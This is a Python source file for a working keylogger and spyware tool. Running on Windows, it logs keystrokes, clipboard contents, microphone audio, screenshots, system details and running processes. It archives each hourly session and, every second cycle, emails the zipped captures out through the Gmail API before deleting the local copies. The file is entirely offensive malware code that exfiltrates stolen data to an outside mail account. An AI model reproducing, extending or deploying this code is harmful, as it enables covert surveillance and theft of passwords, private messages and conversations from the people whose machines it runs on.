# Storing confidential info in .env file
from dotenv import load_dotenv
import os

#For tracking keystrokes
from pynput.keyboard import Key, Listener
import time
import string

# For capturing clipboard
import pyperclip

# For collecting computer info
import socket
import platform
import uuid
import psutil

# For capture audio
from scipy.io.wavfile import write
import sounddevice
import numpy
import wave

# For screenshot
from PIL import ImageGrab
import datetime

# For multithreading
import threading

# For handling file paths
from pathlib import Path

# For email handling
from email.message import EmailMessage
import mimetypes
import base64

# For Gmail API
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

# Define the required scopes for Gmail API
scopes = ["https://www.googleapis.com/auth/gmail.send"]

import shutil

load_dotenv()

def get_filename(filename, dir=""):
    base_path = os.environ.get("FILE_PATH", os.getcwd())
    return os.path.normpath(os.path.join(base_path, dir, filename))

active_listener = None
def keylog(dir):
    keys = []
    last_time = time.time()
    pre_timestamp = 0
    filepath = os.path.join(dir, "keylog.txt")

    def write_file(keys):
        nonlocal pre_timestamp
        with open(filepath, "a") as f:
            for key, timestamp in keys:
                if f.tell() == 0 or timestamp - pre_timestamp >= 60:  # Check if the file is empty
                    f.write(f"=={time.strftime('%Y-%m-%d %H:%M:%S')}==\n")
                pre_timestamp = timestamp

                k = str(key).replace("'", "")
                if k.isalpha() or k in string.punctuation:
                    f.write(k)
                elif k == "Key.space":
                    f.write(" ")
                elif k == "Key.enter":
                    f.write(" [Enter]\n")
                elif "shift_" not in k:
                    f.write(f" [{k}] ")

    def on_press(key):
        nonlocal last_time
        timestamp = time.time()

        keys.append((key, timestamp))
        if len(keys) >= 10:  
            write_file(keys)
            keys.clear()

        last_time = timestamp

    def on_release(key):
        pass  # Do nothing on key release

    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()
    return listener

last_clipboard = None
def capture_clipboard(dir):
    global last_clipboard
    while True:
        time.sleep(3)
        current_clipboard = pyperclip.paste()

        # If clipboard content changes, log it
        if current_clipboard and current_clipboard != last_clipboard:
            filepath = os.path.join(dir, "clipboard.txt")
            with open(filepath, "a") as f:
                try:
                    last_clipboard = current_clipboard
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"\n== {timestamp} ==\n{current_clipboard}\n")
                except:
                    f.write(f"Clipboard could not be copied\n")

# Common system processes to ignore
excluded_processes = [
                "svchost.exe", "winlogon.exe", "explorer.exe", "lsass.exe", "System Idle Process", "spoolsv.exe",
                "csrss.exe", "smss.exe", "wininit.exe", "services.exe", "Memory Compression", "WmiPrvSE.exe",
                "SecurityHealthService.exe", "dwm.exe", "ctfmon.exe", "SearchIndexer.exe", "RuntimeBroker.exe"
]
def get_computer_information(dir):
    while True:
        filepath = os.path.join(dir, "sysinfo.txt")
        with open(filepath, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            MACAddr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])

            system = platform.uname()

            f.write(f"System: {system.system}\n")
            f.write(f"Node Name: {system.node}\n")
            f.write(f"Release: {system.release}\n")
            f.write(f"Version: {system.version}\n")
            f.write(f"Machine: {system.machine}\n")
            f.write(f"Processor: {system.processor}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
            f.write(f"MAC Address: {MACAddr}\n\n")

            f.write("PID\tProcess name\n")
            global excluded_processes
            
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    process_info = proc.info
                    process_name = process_info['name'].lower()
                    if process_name not in excluded_processes and not process_name.startswith("system"):
                        f.write(f"{process_info['pid']:<10} {process_info['name']}\n")
            except Exception as e:
                f.write(f"Process Query Failed: {e}\n")
        
        time.sleep(3600)

def capture_microphone(threshold, dir):
    fs = 44100  # Sampling rate

    while True:
        try:
            buffer = []
            silence_start = None
            recording_has_sound = False

            with sounddevice.InputStream(samplerate=fs, channels=2, dtype="int16") as stream:
                print("Listening...")

                while True:
                    try:
                        audio_chunk, _ = stream.read(fs // 10)  # 0.1 seconds
                        volume_level = numpy.mean(numpy.abs(audio_chunk))
                        
                        if volume_level >= threshold:
                            buffer.append(audio_chunk.tobytes())  # Convert to bytes
                            recording_has_sound = True
                            silence_start = None
                        elif recording_has_sound:
                            buffer.append(audio_chunk.tobytes())
                            if silence_start is None:
                                silence_start = time.time()
                            elif time.time() - silence_start >= 4:
                                print("Silence detected. Stopping recording.")
                                break

                    except sounddevice.PortAudioError as e:
                        print(f"Audio stream error: {e}")
                        break

            # Save only if sound was detected
            if buffer and recording_has_sound:
                filename = get_filename(f"audio_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.wav", dir)
                with wave.open(filename, 'wb') as wf:
                    wf.setnchannels(2)
                    wf.setsampwidth(2)  # 16-bit
                    wf.setframerate(fs)
                    wf.writeframes(b''.join(buffer))
                print(f"Saved audio: {filename}")
            else:
                print("Recording discarded due to low or no sound.")

        except Exception as e:
            print(f"Error in audio capture: {e}")

        time.sleep(2)

def capture_screenshot(dir):
    while True:
        screenshot = get_filename(f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png", dir)
        im = ImageGrab.grab(all_screens=True)
        im.save(screenshot)
        time.sleep(1800)

results_dir = Path("Results")
results_dir.mkdir(exist_ok=True)
def create_output_folders(dir):
    global results_dir
    paths = {
        "keylogs": get_filename("keylogs", f"{results_dir}\\{dir}\\"),
        "screenshots": get_filename("screenshots", f"{results_dir}\\{dir}\\"),
        "audio": get_filename("audio", f"{results_dir}\\{dir}\\"),
        "clipboard": get_filename("clipboard", f"{results_dir}\\{dir}\\"),
        "sysinfo": get_filename("sysinfo", f"{results_dir}\\{dir}\\")
    }

    for path in paths.values():
        os.makedirs(path, exist_ok=True)
    return paths

def gmail_create_message_with_attachment(toaddr):
    fromaddr = os.environ.get("EMAIL_ADDRESS", "null")
    if fromaddr == "null":
        return None
    
    try:
        mime_message = EmailMessage()

        mime_message["To"] = toaddr
        mime_message["From"] = fromaddr
        mime_message["Subject"] = f"KeyLogger_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"

        mime_message.set_content("Hi, this is an automated mail with an attachment. Please do not reply.")

        for attachment_filename in list(results_dir.glob("*.zip")):
            type_subtype, _ = mimetypes.guess_type(attachment_filename)
            if type_subtype:
                maintype, subtype = type_subtype.split("/")
            else:
                maintype, subtype = "application", "octet-stream"  # Default type

            with open(attachment_filename, "rb") as fp:
                attachment_data = fp.read()
        
            mime_message.add_attachment(attachment_data, maintype, subtype, filename=os.path.basename(attachment_filename))

        encoded_message = base64.urlsafe_b64encode(mime_message.as_bytes()).decode()
        return encoded_message
    except Exception as error:
        print(f"An error occurred while creating message: {error}")
        return None

def gmail_send_message(encoded_message):
    # Sends an email via Gmail API.
    creds = Credentials.from_authorized_user_file(os.environ.get("TOKEN_FILE"), scopes)
    try:
        service = build("gmail", "v1", credentials=creds)

        create_message = {"raw": encoded_message}
        
        send_message = service.users().messages().send(userId="me", body=create_message).execute()
        print(f'Message ID: {send_message["id"]}')
    except HttpError as error:
        print(f"An error occurred: {error}")

previous_dir = None
cycle_count = 0

def start_keylogging():

    global previous_dir, active_listener, cycle_count
    cycle_count += 1
    new_dir = f"result_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    results = create_output_folders(new_dir)
    
    if active_listener:
        active_listener.stop() # stop previous listener thread

    active_listener = keylog(f"{results['keylogs']}\\")
    current_threads = [
        threading.Thread(target=capture_clipboard, args=(f"{results['clipboard']}\\",), daemon=True),
        threading.Thread(target=get_computer_information, args=(f"{results['sysinfo']}\\",),  daemon=True),
        threading.Thread(target=capture_microphone, args=(1000, f"{results['audio']}\\",), daemon=True),
        threading.Thread(target=capture_screenshot, args=(f"{results['screenshots']}\\",),  daemon=True),
    ]

    for t in current_threads:
        t.start()
    
    # remove previous directory to save space
    if previous_dir:
        try:
            full_prev_dir = results_dir / previous_dir
            zip_path = full_prev_dir.resolve()  # Full path for archiving
            print(zip_path)
            shutil.make_archive(zip_path, format="zip", root_dir=zip_path)
            shutil.rmtree(zip_path)
            print(f"Removed old folder: {previous_dir}")
        except Exception as e:
            print(f"Could not delete {previous_dir}: {e}")

    previous_dir = new_dir

    # Every two cycles, send files through email and cleanup
    if cycle_count % 2 == 0:
        toaddr = os.environ.get("EMAIL_ADDRESS")
        encoded_email = gmail_create_message_with_attachment(toaddr)
        if encoded_email:
            gmail_send_message(encoded_email)
            print("Email sent successfully.")

            for item in results_dir.iterdir():
                try:
                    if item.is_file() or item.suffix == ".zip":
                        item.unlink()
                    elif item.is_dir():
                        shutil.rmtree(item)
                except Exception as e:
                    print(f"Could not delete {item}: {e}")
                
        else:
            print("Email sending failed.")

# Loop every 1 hour to rotate session
while True:
    start_keylogging()
    time.sleep(3600)  # 1 hours = 3600 seconds
